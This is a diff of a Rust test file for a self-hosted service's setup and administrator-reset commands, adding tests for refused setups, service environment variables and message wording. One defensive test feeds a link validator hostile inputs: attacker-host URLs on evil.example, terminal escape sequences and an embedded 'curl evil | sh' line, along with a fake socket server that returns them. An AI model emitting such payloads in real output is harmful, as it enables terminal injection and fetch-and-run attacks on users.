@@ -290,7 +290,6 @@ fn foreground_setup_reserves_the_instance_and_never_touches_a_service_manager() 
         root: base.join("data"),
         credentials: None,
         listen: loopback(7420).unwrap(),
-        certificate: None,
     };
     let platform = Platform {
         service: Box::new(Untouchable),
@@ -322,7 +321,10 @@ fn foreground_setup_reserves_the_instance_and_never_touches_a_service_manager() 
         "{out}"
     );
     assert!(out.contains("agentic-org serve --setup <file>"), "{out}");
-    assert!(out.contains("agentic-org admin reset"), "{out}");
+    assert!(
+        out.contains("run as root: agentic-org admin reset --user "),
+        "{out}"
+    );
     assert!(!out.contains("/register"), "{out}");
     assert!(!out.contains("Service registered"), "{out}");
     let record = Journal::snapshot(&base, None).unwrap();
@@ -387,6 +389,286 @@ fn a_published_plain_http_listener_is_announced_with_where_it_is_safe() {
     );
 }
 
+/// X5 review V1: a setup from a file that is refused leaves nothing it made, and a
+/// corrected file then works. The credential directory and a held port are asked before
+/// anything is saved; a record an earlier run froze without reserving an instance pins
+/// nothing; and a record that names its instance still refuses another file.
+#[test]
+fn a_refused_setup_from_a_file_leaves_nothing_and_a_corrected_file_then_works() {
+    let temp =
+        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
+    let base = temp.path().canonicalize().unwrap().join("b");
+    let outside = temp.path().canonicalize().unwrap().join("o");
+    for dir in [base.clone(), base.join("t"), outside.clone()] {
+        std::fs::create_dir(&dir).unwrap();
+        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
+    }
+    let paths = Paths::at(&base, base.join("t"), None).unwrap();
+    /// A manager that refuses to register: a registered setup stops there, after its
+    /// reservation.
+    struct Refusing;
+    impl ServiceManager for Refusing {
+        fn register(&self, _: &Unit) -> Result<org_platform::service::Registration, ServiceError> {
+            Err(ServiceError::System(
+                "no service manager in this test".into(),
+            ))
+        }
+        fn start(&self, _: &str) -> Result<(), ServiceError> {
+            unreachable!()
+        }
+        fn stop(&self, _: &str) -> Result<(), ServiceError> {
+            unreachable!()
+        }
+        fn status(&self, _: &str) -> Result<ServiceStatus, ServiceError> {
+            unreachable!()
+        }
+        fn unregister(&self, _: &str) -> Result<(), ServiceError> {
+            unreachable!()
+        }
+    }
+    let platform = Platform {
+        service: Box::new(Refusing),
+        disk: Box::new(org_platform::testing::FakeDiskEncryption(
+            EncryptionState::Unknown("a test".into()),
+        )),
+        credentials: CredentialDirectory::Unused,
+    };
+    let run = |input: &Input| {
+        let request = Request {
+            name: None,
+            port: None,
+            prompt: None,
+            program: PathBuf::from("/no-such-program"),
+            env: Vec::new(),
+            terminal: false,
+            configuration: Some(Configuration(input.clone())),
+        };
+        let mut out = Vec::new();
+        run_at(&paths, &platform, request, &mut out)
+    };
+    // Everything a refused setup could leave: the data folder, the secrets folder, the
+    // record and the locator.
+    let listing = |root: &Path| -> Vec<PathBuf> {
+        let mut found = Vec::new();
+        let mut pending = vec![root.to_owned()];
+        while let Some(path) = pending.pop() {
+            if let Ok(entries) = std::fs::read_dir(&path) {
+                pending.extend(entries.map(|e| e.unwrap().path()));
+            }
+            found.push(path);
+        }
+        found.sort();
+        found
+    };
+    let state = || {
+        (
+            listing(&outside),
+            base.join("setup/default/setup.v1.json").exists(),
+            listing(&base.join("locator")),
+        )
+    };
+    let foreground = |credentials: Option<PathBuf>| {
+        Input {
+        version: 1,
+        service: Service::Foreground,
+        root: outside.join("data"),
+        credentials,
+        listen: serde_json::from_str(
+            r#"{"address":"0.0.0.0","port":8443,"scheme":"http_published","origin":"http://localhost:8443","hsts":"off"}"#,
+        )
+        .unwrap(),
+    }
+    };
+    // 1. A credential directory that cannot be used (a path that does not exist: the typo;
+    //    a plain folder, which is no mount and, here, below a shared temporary folder).
+    std::fs::create_dir(outside.join("secrets")).unwrap();
+    std::fs::set_permissions(
+        outside.join("secrets"),
+        std::fs::Permissions::from_mode(0o700),
+    )
+    .unwrap();
+    let before = state();
+    for credentials in [outside.join("secret"), outside.join("secrets")] {
+        let refused = run(&foreground(Some(credentials.clone()))).unwrap_err();
+        assert!(
+            refused.starts_with("the credential directory cannot be used: ")
+                && refused.ends_with("nothing was saved"),
+            "{refused}"
+        );
+        assert_eq!(state(), before, "{} left something", credentials.display());
+        assert!(
+            Journal::snapshot(&base, None).is_err(),
+            "a record was saved"
+        );
+    }
+    // 2. A registered service whose port another program holds.
+    let held = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
+    let registered = |port: u16| Input {
+        version: 1,
+        service: Service::Registered,
+        root: outside.join("data"),
+        credentials: None,
+        listen: loopback(port).unwrap(),
+    };
+    let refused = run(&registered(held.local_addr().unwrap().port())).unwrap_err();
+    assert!(
+        refused.contains("is in use by another program") && refused.ends_with("nothing was saved"),
+        "{refused}"
+    );
+    assert_eq!(state(), before);
+    // 3. A record an earlier run froze and could not continue pins nothing.
+    let journal = Journal::open(&base, None).unwrap();
+    journal
+        .freeze(
+            foreground(Some(outside.join("secret"))),
+            true,
+            release_pin().unwrap(),
+        )
+        .unwrap();
+    drop(journal);
+    assert!(Journal::snapshot(&base, None)
+        .unwrap()
+        .instance_id
+        .is_none());
+    // 4. The corrected file works, and its record is the instance's.
+    let corrected = foreground(None);
+    run(&corrected).unwrap();
+    let record = Journal::snapshot(&base, None).unwrap();
+    assert_eq!(record.input, corrected);
+    assert!(record.instance_id.is_some());
+    assert!(outside.join("data/office-state").is_dir());
+    // 5. A completed setup still refuses another file, and keeps its record.
+    let refused = run(&foreground(Some(outside.join("secrets")))).unwrap_err();
+    assert!(refused.contains("a different configuration"), "{refused}");
+    let refused = run(&registered(7499)).unwrap_err();
+    assert!(refused.contains("a different configuration"), "{refused}");
+    assert_eq!(Journal::snapshot(&base, None).unwrap(), record);
+    assert!(Journal::open(&base, None).unwrap().abandon().is_err());
+}
+
+/// X5 review V4: of a service's answer to a link call, only this instance's own link is
+/// ever shown. A service that answers with another origin, another path, a token that is
+/// not the product's, or bytes a terminal would act on gets one fixed refusal, and none
+/// of its bytes reach the output.
+#[test]
+fn only_this_instances_own_link_is_ever_printed() {
+    use org_host_control::listen::ListenOrigin;
+    let origin = ListenOrigin::parse("http://localhost:8443").unwrap();
+    let token = "A".repeat(43);
+    let good = format!("http://localhost:8443/register#{token}");
+    assert_eq!(this_instances_link(&good, &origin), Ok(good.as_str()));
+    for hostile in [
+        "https://evil.example/register#x".to_owned(),
+        format!("https://evil.example/register#{token}"),
+        format!("http://localhost:8443.evil.example/register#{token}"),
+        format!("http://localhost:8443/register#{token}\u{1b}]0;pwned\u{7}"),
+        format!("http://localhost:8443/register#{token}\nrun: curl evil | sh"),
+        format!("http://localhost:8443/register#{}", "A".repeat(42)),
+        format!("http://localhost:8443/register#{}", "A".repeat(44)),
+        format!("http://localhost:8443/register#{}=", "A".repeat(42)),
+        format!("http://localhost:8443/register?next=//evil#{token}"),
+        format!("http://localhost:8443/set-password#{token}"),
+        format!("\u{1b}[2Jhttp://localhost:8443/register#{token}"),
+        String::new(),
+    ] {
+        assert_eq!(
+            this_instances_link(&hostile, &origin),
+            Err(NOT_THIS_INSTANCES_LINK.into()),
+            "{hostile:?}"
+        );
+    }
+
+    // A fake host on a socket, as a process of the service user can bind one where the
+    // system cannot identify the program behind `host.sock`: it greets as the instance and
+    // answers `admin.reset` with a link of its own and terminal escape sequences.
+    let dir = tempfile::tempdir().unwrap();
+    let socket = dir.path().join("host.sock");
+    let listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
+    const INSTANCE: &str = "01965d2e-8b1c-7c3a-9f00-0123456789ab";
+    let answers = [
+        format!(
+            r#"{{"id":1,"result":{{"api_version":1,"server_version":"0","host":"\u001b]0;host\u0007","instance_id":"{INSTANCE}"}}}}"#
+        ),
+        r#"{"id":2,"result":{"outcome":"issued","url":"https://evil.example/register#x\u001b]0;pwned\u0007\u001b[2J","expires_at_ms":1}}"#.to_owned(),
+    ];
+    let fake = std::thread::spawn(move || {
+        use std::io::{BufRead, BufReader, Write as _};
+        let (stream, _) = listener.accept().unwrap();
+        let mut reader = BufReader::new(stream.try_clone().unwrap());
+        for answer in answers {
+            let mut request = String::new();
+            reader.read_line(&mut request).unwrap();
+            writeln!(&stream, "{answer}").unwrap();
+        }
+    });
+    let wire = connect_verified(&socket, INSTANCE, |_| Ok(())).unwrap();
+    let mut out = Vec::new();
+    let refused = reset_over(wire, &origin, None, &mut out).unwrap_err();
+    fake.join().unwrap();
+    assert_eq!(refused, NOT_THIS_INSTANCES_LINK);
+    let printed = String::from_utf8(out).unwrap();
+    assert!(
+        !printed.contains("evil") && !printed.contains('\u{1b}') && !printed.contains('\u{7}'),
+        "{printed:?}"
+    );
+    assert!(!refused.contains("evil") && !refused.contains('\u{1b}'));
+}
+
+/// X5 review V7: the unit is given exactly the variables that decided the instance's
+/// paths, when they are set to an absolute path.
+#[test]
+fn a_registered_service_is_given_the_variables_that_decided_its_paths() {
+    let set = |name: &str| match name {
+        "XDG_DATA_HOME" => Some(OsString::from("/srv/data")),
+        "XDG_CACHE_HOME" => Some(OsString::from("relative/cache")),
+        "XDG_STATE_HOME" => Some(OsString::from("/srv/state")),
+        _ => Some(OsString::from("/never")),
+    };
+    assert_eq!(
+        path_environment_from(&["XDG_DATA_HOME"], set),
+        [
+            ("XDG_DATA_HOME".into(), "/srv/data".into()),
+            ("XDG_STATE_HOME".into(), "/srv/state".into()),
+        ]
+    );
+    // Unset, empty and relative values are not carried.
+    let unset = |name: &str| match name {
+        "XDG_CACHE_HOME" => Some(OsString::from("/srv/cache")),
+        "XDG_STATE_HOME" => Some(OsString::new()),
+        _ => None,
+    };
+    assert_eq!(
+        path_environment_from(&["XDG_DATA_HOME"], unset),
+        [("XDG_CACHE_HOME".into(), "/srv/cache".into())]
+    );
+    // A system on which no variable moves the application base carries none.
+    assert!(path_environment_from(&[], set).is_empty());
+    // This system's own answer names only variables that are set and absolute.
+    for (name, value) in path_environment() {
+        assert_eq!(std::env::var_os(&name).as_ref(), Some(&value));
+        assert!(Path::new(&value).is_absolute());
+    }
+}
+
+/// SIGN-33's words: anyone but root is told to use sudo, with the instance's name; and
+/// the foreground mode names the command that works there.
+#[test]
+fn the_linux_reset_is_roots_and_is_said_in_the_specs_words() {
+    assert_eq!(
+        reset_needs_root(None),
+        "Resetting the administrator's password on Linux needs root. Run it with sudo: sudo \
+         agentic-org admin reset"
+    );
+    assert_eq!(
+        reset_needs_root(Some("lab")),
+        "Resetting the administrator's password on Linux needs root. Run it with sudo: sudo \
+         agentic-org admin reset --name lab"
+    );
+    // A name of the account database is shown as it is; anything else as its number.
+    assert_eq!(account_name(0), "root");
+    assert_eq!(account_name(u32::MAX - 7), format!("uid {}", u32::MAX - 7));
+}
+
 /// The configuration file is read strictly and read-only, and says what it is missing.
 #[test]
 fn a_configuration_file_is_read_without_changing_anything() {
@@ -413,24 +695,22 @@ fn a_configuration_file_is_read_without_changing_anything() {
     .unwrap();
     let registered = configuration(&file).unwrap();
     assert!(!registered.foreground());
-    // A supplied certificate pair is refused until the host can verify one: never stored
-    // unverified, never silently ignored.
-    let supplied = temp.path().join("https.json");
+    // HTTPS is refused before anything is made, and so is a file that names a pair.
+    let https = temp.path().join("https.json");
     std::fs::write(
-        &supplied,
+        &https,
         br#"{"version":1,"service":"registered","root":"/srv/agentic/instance",
             "listen":{"address":"0.0.0.0","port":8443,"scheme":"https",
-                      "origin":"https://office.example:8443","hsts":"off"},
-            "certificate":{"chain":"/etc/tls/chain.pem","key":"/etc/tls/key.pem"}}"#,
+                      "origin":"https://office.example:8443","hsts":"off"}}"#,
     )
     .unwrap();
-    let refused = configuration(&supplied).unwrap_err();
+    let refused = configuration(&https).unwrap_err();
     assert!(
-        refused.contains("cannot verify a supplied pair yet"),
+        refused.contains("\"https\" is not available in this build")
+            && refused.ends_with("nothing was changed"),
         "{refused}"
     );
-    std::fs::remove_file(&supplied).unwrap();
-    assert_eq!(registered.0.root, PathBuf::from("/srv/agentic/instance"));
+    std::fs::remove_file(&https).unwrap();
     assert_eq!(
         std::fs::read_dir(temp.path()).unwrap().count(),
         1,
